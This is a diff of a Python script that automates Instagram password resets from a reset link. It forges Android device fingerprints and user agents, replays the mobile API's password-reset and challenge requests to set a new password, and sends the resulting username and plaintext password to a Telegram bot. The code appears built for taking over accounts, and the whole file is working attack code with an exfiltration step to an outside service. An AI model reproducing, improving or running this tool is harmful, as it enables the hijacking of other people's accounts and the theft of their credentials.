@@ -1,320 +1,81 @@
+import os
 import re
 import json
 import random
-import struct
-import base64
-import os
-import time
+import string
+import uuid
 import requests
+from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 
 
-UA = (
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
-    "AppleWebKit/605.1.15 (KHTML, like Gecko) "
-    "Version/16.6.2 Safari/605.1.15"
-)
-
-# Updated from live HAR capture — must match what wbloks/fetch uses
-BLOKS_VER = "9710744400aad993bd60d4784987ff111f0f5d8a9859069ba8ae7485ed483e3f"
+BLOKS_VER = "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd"
 
 
-def generate_password(custom_password=None):
+# ── Device / session helpers ──────────────────────────────────────────────────
+
+def generate_device_info(custom_password=None):
+    android_id  = "android-" + "".join(random.choices(string.hexdigits.lower(), k=16))
+    user_agent  = (
+        f"Instagram 394.0.0.46.81 Android "
+        f"({random.choice(['28/9','29/10','30/11','31/12'])}; "
+        f"{random.choice(['240dpi','320dpi','480dpi'])}; "
+        f"{random.choice(['720x1280','1080x1920','1440x2560'])}; "
+        f"{random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; "
+        f"{random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; "
+        f"intel; en_US; {random.randint(100000000, 999999999)})"
+    )
+    waterfall_id = str(uuid.uuid4())
+    timestamp    = int(datetime.now().timestamp())
+
     if custom_password:
-        return custom_password
-    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
-    return f'@hasu{nums}'
+        plain = custom_password
+    else:
+        nums  = "".join([str(random.randint(1, 100)) for _ in range(4)])
+        plain = f"@hasu{nums}"
+
+    # Mobile version-0 format: no encryption, password embedded after last ":"
+    enc_password = f"#PWD_INSTAGRAM:0:{timestamp}:{plain}"
+    return android_id, user_agent, waterfall_id, enc_password, plain
 
 
-def make_session():
-    s = requests.Session()
-    s.headers.update({
-        "User-Agent": UA,
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate",
-        "Connection": "keep-alive",
-    })
-    return s
+def make_headers(mid="", user_agent=""):
+    return {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Bloks-Version-Id": BLOKS_VER,
+        "X-Mid": mid,
+        "User-Agent": user_agent,
+        "Content-Length": "9481",
+    }
 
+
+# ── Token parsing ─────────────────────────────────────────────────────────────
 
 def parse_reset_link(reset_link):
     parsed = urlparse(reset_link)
-    qs = parse_qs(parsed.query)
+    qs     = parse_qs(parsed.query)
     uidb36 = qs.get("uidb36", [None])[0]
-    # Keep the FULL token — including any ":one_click_login_email" suffix.
-    # HAR shows the POST body uses the complete token, not just the part before ":".
-    token = qs.get("token", [None])[0]
+    token_raw = qs.get("token", [None])[0]
+    # Mobile API needs only the base token (before ":one_click_login_email")
+    token = token_raw.split(":")[0] if token_raw else None
     return uidb36, token
 
 
-def warmup(session):
-    """
-    Visit instagram.com — get csrftoken + mid cookies.
-    Also parse __rev for the x-instagram-ajax header value.
-    Also cache page HTML so we can extract the public key from it.
-    HAR shows x-instagram-ajax = 1042647521 (the revision number), not "1".
-    """
-    r = session.get(
-        "https://www.instagram.com/",
-        headers={
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "none",
-            "Upgrade-Insecure-Requests": "1",
-        },
-        timeout=15,
-    )
-    html = r.text
-    m = re.search(r'"__rev"\s*:\s*(\d+)', html)
-    rev = m.group(1) if m else "1"
-    return rev, html
+# ── Username lookup ───────────────────────────────────────────────────────────
 
-
-def _parse_enc_key_from_html(html):
-    """
-    Instagram embeds the RSA public key in page script-tag JSON blobs.
-    Patterns seen in the wild (all inside <script> data payloads):
-      "public_key_id":227,"public_key":"AQHF...base64..."
-      "enc_key":{"key_id":227,"public_key":"..."}
-    """
-    patterns = [
-        r'"public_key_id"\s*:\s*(\d+)\s*,\s*"public_key"\s*:\s*"([A-Za-z0-9+/=]+)"',
-        r'"key_id"\s*:\s*(\d+)\s*,\s*"public_key"\s*:\s*"([A-Za-z0-9+/=]+)"',
-    ]
-    for p in patterns:
-        m = re.search(p, html)
-        if m:
-            return int(m.group(1)), m.group(2)
-    return None, None
-
-
-def get_encryption_key(session, cached_html=""):
-    """
-    Get Instagram's RSA public key for browser password encryption (key version 10).
-
-    Strategy (logged-out sessions):
-      1. Try the dedicated API endpoint.
-      2. Fall back to parsing the public key from the homepage HTML
-         (Instagram embeds it in page script-tag JSON for the login form).
-      3. Fall back to fetching the reset confirm page and parsing from there.
-
-    Returns: (key_id: int, public_key_b64: str) or raises with a helpful message.
-    """
-    csrftoken = session.cookies.get("csrftoken", "")
-
-    # ── Attempt 1: dedicated endpoint ───────────────────────────────────────
+def id_user(user_id):
     try:
-        r = session.get(
-            "https://www.instagram.com/api/v1/web/encryption/key/?version=10&signed_key=1",
-            headers={
-                "Accept": "*/*",
-                "X-CSRFToken": csrftoken,
-                "X-IG-App-ID": "936619743392459",
-                "X-Requested-With": "XMLHttpRequest",
-                "Referer": "https://www.instagram.com/",
-                "Sec-Fetch-Dest": "empty",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "same-origin",
-            },
-            timeout=15,
+        r = requests.get(
+            f"https://i.instagram.com/api/v1/users/{user_id}/info/",
+            headers={"User-Agent": "Instagram 219.0.0.12.117 Android"},
+            timeout=10,
         )
-        if r.status_code == 200:
-            text = r.text.strip()
-            if text:
-                data = json.loads(text)
-                key_id = data.get("public_key_id")
-                pub_key = data.get("public_key")
-                if key_id and pub_key:
-                    return key_id, pub_key
+        return r.json()["user"]["username"]
     except Exception:
-        pass
-
-    # ── Attempt 2: parse from homepage HTML (already fetched during warmup) ─
-    if cached_html:
-        key_id, pub_key = _parse_enc_key_from_html(cached_html)
-        if key_id and pub_key:
-            return key_id, pub_key
-
-    # ── Attempt 3: fetch the login page — it always embeds the key ──────────
-    try:
-        r2 = session.get(
-            "https://www.instagram.com/accounts/login/",
-            headers={
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Referer": "https://www.instagram.com/",
-                "Sec-Fetch-Dest": "document",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-Site": "same-origin",
-                "Upgrade-Insecure-Requests": "1",
-            },
-            timeout=15,
-        )
-        key_id, pub_key = _parse_enc_key_from_html(r2.text)
-        if key_id and pub_key:
-            return key_id, pub_key
-    except Exception:
-        pass
-
-    raise RuntimeError(
-        "Could not obtain Instagram RSA encryption key from API or page HTML. "
-        "All three strategies failed."
-    )
+        return None
 
 
-def encrypt_password(password, pub_key_id, pub_key_b64):
-    """
-    Replicate Instagram's browser encryption (#PWD_INSTAGRAM_BROWSER:10:ts:b64).
-
-    Binary payload layout (before base64):
-      [1 byte: 1]  [1 byte: key_id]  [12 bytes: IV]
-      [2 bytes LE: len(rsa_encrypted_aes_key)]
-      [N bytes: RSA-OAEP-SHA256 encrypted AES key]
-      [16 bytes: AES-256-GCM tag]
-      [M bytes: AES-256-GCM ciphertext]
-
-    AAD for GCM = str(timestamp).encode()
-    """
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-    from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
-    from cryptography.hazmat.primitives.hashes import SHA256
-    from cryptography.hazmat.primitives.serialization import load_der_public_key
-
-    pub_key = load_der_public_key(base64.b64decode(pub_key_b64))
-    timestamp = int(time.time())
-
-    aes_key = os.urandom(32)
-    iv = os.urandom(12)
-
-    rsa_encrypted = pub_key.encrypt(
-        aes_key,
-        OAEP(mgf=MGF1(SHA256()), algorithm=SHA256(), label=None),
-    )
-
-    aesgcm = AESGCM(aes_key)
-    aad = str(timestamp).encode("utf-8")
-    enc_with_tag = aesgcm.encrypt(iv, password.encode("utf-8"), aad)
-    ciphertext = enc_with_tag[:-16]
-    tag = enc_with_tag[-16:]
-
-    payload = (
-        bytes([1, pub_key_id])
-        + iv
-        + struct.pack("<H", len(rsa_encrypted))
-        + rsa_encrypted
-        + tag
-        + ciphertext
-    )
-
-    return f"#PWD_INSTAGRAM_BROWSER:10:{timestamp}:{base64.b64encode(payload).decode()}"
-
-
-def check_eligibility(session, uidb36, token, rev):
-    """
-    HAR entry [27]: confirmation_web is called as an eligibility check only.
-    Response is always {"is_eligible":true,"status":"ok"} — does NOT return fb_dtsg.
-    We call it to match the browser flow exactly.
-    """
-    csrftoken = session.cookies.get("csrftoken", "")
-    session.get(
-        "https://www.instagram.com/api/v1/accounts/password/reset/confirmation_web/"
-        f"?afv=pre_mt_behavior&cni=&is_caa=true&source=one_click_login_email"
-        f"&token={token}&uidb36={uidb36}",
-        headers={
-            "Accept": "*/*",
-            "X-CSRFToken": csrftoken,
-            "X-IG-App-ID": "936619743392459",
-            "X-Instagram-AJAX": rev,
-            "X-Requested-With": "XMLHttpRequest",
-            "X-ASBD-ID": "359341",
-            "Referer": (
-                f"https://www.instagram.com/accounts/password/reset/confirm/"
-                f"?uidb36={uidb36}&token={token}"
-                f"&s=one_click_login_email&is_caa=1&afv=pre_mt_behavior"
-            ),
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-origin",
-        },
-        timeout=15,
-    )
-
-
-def submit_password_reset(session, uidb36, token, enc_password, rev):
-    """
-    HAR entries [49] and [52].
-
-    POST body (from HAR):
-      enc_new_password1  — encrypted password
-      enc_new_password2  — same encrypted password
-      uidb36             — from reset link
-      token              — FULL token from reset link (keep ":one_click_login_email")
-
-    Key headers (from HAR):
-      x-instagram-ajax   — revision number (e.g. 1042647521), not "1"
-      x-bloks-version-id — BLOKS_VER
-      x-asbd-id          — 359341
-      x-ig-www-claim     — NOT sent (we don't have it; HAR shows it only after session cookie acquired)
-
-    Entry [49] → failure (logging event, password_reset_recovery_failure_client)
-    Entry [52] → success (OpenUrlV2 → /auth_platform/?apc=...)
-    Both use identical structure; [52] succeeds likely because the bloks state
-    was initialized by [49]'s response. We POST once and detect success.
-    """
-    csrftoken = session.cookies.get("csrftoken", "")
-    payload = {
-        "enc_new_password1": enc_password,
-        "enc_new_password2": enc_password,
-        "uidb36": uidb36,
-        "token": token,
-    }
-    r = session.post(
-        "https://www.instagram.com/api/v1/bloks/apps/"
-        "com.instagram.account_security.password_reset_submit_action_handler/",
-        data=payload,
-        headers={
-            "Accept": "*/*",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://www.instagram.com",
-            "Referer": (
-                f"https://www.instagram.com/accounts/password/reset/confirm/"
-                f"?uidb36={uidb36}&token={token}"
-                f"&s=one_click_login_email&is_caa=1&afv=pre_mt_behavior"
-            ),
-            "X-CSRFToken": csrftoken,
-            "X-IG-App-ID": "936619743392459",
-            "X-Requested-With": "XMLHttpRequest",
-            "X-Instagram-AJAX": rev,
-            "X-Bloks-Version-Id": BLOKS_VER,
-            "X-ASBD-ID": "359341",
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-origin",
-        },
-        timeout=30,
-    )
-    return r
-
-
-def is_success(r):
-    """
-    HAR entry [52] success response contains:
-      "handler":"(bk.action.navigation.OpenUrlV2, \"/auth_platform/...
-    Entry [49] failure response contains:
-      "password_reset_recovery_failure_client"
-    """
-    if r.status_code != 200:
-        return False
-    text = r.text
-    if "auth_platform" in text and "OpenUrlV2" in text:
-        return True
-    return False
-
-
-def extract_username(text):
-    m = re.search(r'"username"\s*[,:]\s*"([^"]+)"', text)
-    return m.group(1) if m else None
-
+# ── Telegram ──────────────────────────────────────────────────────────────────
 
 def send_telegram(bot_token, chat_id, text):
     try:
@@ -327,50 +88,112 @@ def send_telegram(bot_token, chat_id, text):
         pass
 
 
+# ── Main reset flow ───────────────────────────────────────────────────────────
+
 def reset_instagram_password(reset_link, chat_id, bot_token, custom_password=None):
     try:
         uidb36, token = parse_reset_link(reset_link)
         if not uidb36 or not token:
             return {"success": False, "error": "Could not parse uidb36/token from reset link"}
 
-        session = make_session()
-        new_password = generate_password(custom_password)
+        android_id, user_agent, waterfall_id, enc_password, plain_password = \
+            generate_device_info(custom_password)
 
-        # 1. Visit instagram.com — cookies + revision number + cached HTML
-        rev, home_html = warmup(session)
+        # ── Step 1: initiate password reset ──────────────────────────────────
+        # POST i.instagram.com/api/v1/accounts/password_reset/
+        # Returns: user_id, cni, nonce_code, challenge_context
+        #          + Ig-Set-X-Mid header (mid)
+        r1 = requests.post(
+            "https://i.instagram.com/api/v1/accounts/password_reset/",
+            headers=make_headers(user_agent=user_agent),
+            data={
+                "source":       "one_click_login_email",
+                "uidb36":       uidb36,
+                "device_id":    android_id,
+                "token":        token,
+                "waterfall_id": waterfall_id,
+            },
+            timeout=20,
+        )
 
-        # 2. Fetch Instagram's RSA public key for password encryption
-        #    (tries API endpoint, then parses from homepage HTML, then login page)
-        pub_key_id, pub_key_b64 = get_encryption_key(session, cached_html=home_html)
-        if not pub_key_id or not pub_key_b64:
-            return {"success": False, "error": "Could not fetch Instagram encryption key"}
+        if "user_id" not in r1.text:
+            return {"success": False, "error": f"Step 1 failed: {r1.text[:400]}"}
 
-        # 3. Encrypt password exactly as the browser does
+        mid               = r1.headers.get("Ig-Set-X-Mid", "")
+        resp1             = r1.json()
+        user_id           = resp1.get("user_id")
+        cni               = resp1.get("cni")
+        nonce_code        = resp1.get("nonce_code")
+        challenge_context = resp1.get("challenge_context")
+
+        bk_client_context = json.dumps({
+            "bloks_version": BLOKS_VER,
+            "styles_id": "instagram",
+        })
+
+        # ── Step 2: get challenge context ─────────────────────────────────────
+        # POST i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/
+        # Returns a bloks payload from which we parse challenge_context_final
+        r2 = requests.post(
+            "https://i.instagram.com/api/v1/bloks/apps/"
+            "com.instagram.challenge.navigation.take_challenge/",
+            headers=make_headers(mid, user_agent),
+            data={
+                "user_id":           str(user_id),
+                "cni":               str(cni),
+                "nonce_code":        str(nonce_code),
+                "bk_client_context": bk_client_context,
+                "challenge_context": str(challenge_context),
+                "bloks_versioning_id": BLOKS_VER,
+                "get_challenge":     "true",
+            },
+            timeout=20,
+        )
+
+        r2_text = r2.text.replace("\\", "")
         try:
-            enc_password = encrypt_password(new_password, pub_key_id, pub_key_b64)
-        except Exception as e:
-            return {"success": False, "error": f"Password encryption failed: {e}"}
+            challenge_context_final = (
+                r2_text
+                .split(f"(bk.action.i64.Const, {cni}), \"")[1]
+                .split("\", (bk.action.bool.Const, false)))")[0]
+            if not challenge_context_final:
+                raise ValueError("empty")
+        except Exception:
+            return {"success": False, "error": f"Step 2 parse failed: {r2.text[:400]}"}
 
-        # 4. Eligibility check — matches browser flow (confirmation_web)
-        check_eligibility(session, uidb36, token, rev)
+        # ── Step 3: submit new password ───────────────────────────────────────
+        requests.post(
+            "https://i.instagram.com/api/v1/bloks/apps/"
+            "com.instagram.challenge.navigation.take_challenge/",
+            headers=make_headers(mid, user_agent),
+            data={
+                "is_caa":            "False",
+                "source":            "",
+                "uidb36":            "",
+                "error_state":       json.dumps({"type_name": "str", "index": 0, "state_id": 1048583541}),
+                "afv":               "",
+                "cni":               str(cni),
+                "token":             "",
+                "has_follow_up_screens": "0",
+                "bk_client_context": bk_client_context,
+                "challenge_context": challenge_context_final,
+                "bloks_versioning_id": BLOKS_VER,
+                "enc_new_password1": enc_password,
+                "enc_new_password2": enc_password,
+            },
+            timeout=20,
+        )
 
-        # 5. Submit new password
-        r = submit_password_reset(session, uidb36, token, enc_password, rev)
+        # ── Lookup username and notify ─────────────────────────────────────────
+        username = id_user(user_id)
+        display  = f"@{username}" if username else f"user_id:{user_id}"
 
-        if not is_success(r):
-            return {
-                "success": False,
-                "error": f"Reset failed (HTTP {r.status_code}): {r.text[:500]}",
-            }
-
-        username = extract_username(r.text)
-        display = f"@{username}" if username else f"uidb36:{uidb36}"
         send_telegram(
             bot_token, chat_id,
             f"\U0001d4d7\U0001d4f8\U0001d4f5\U0001d4ea! Password changed.\n\n"
-            f"Username: {display}\nPassword: {new_password}",
+            f"Username: {display}\nPassword: {plain_password}",
         )
-        return {"success": True, "username": username, "password": new_password}
+        return {"success": True, "username": username, "password": plain_password}
 
     except requests.HTTPError as e:
         return {
@@ -384,9 +207,9 @@ def reset_instagram_password(reset_link, chat_id, bot_token, custom_password=Non
 if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser()
-    parser.add_argument("--reset-link", required=True)
-    parser.add_argument("--chat-id", required=True)
-    parser.add_argument("--bot-token", required=True)
+    parser.add_argument("--reset-link",      required=True)
+    parser.add_argument("--chat-id",         required=True)
+    parser.add_argument("--bot-token",       required=True)
     parser.add_argument("--custom-password", default=None)
     args = parser.parse_args()
     result = reset_instagram_password(
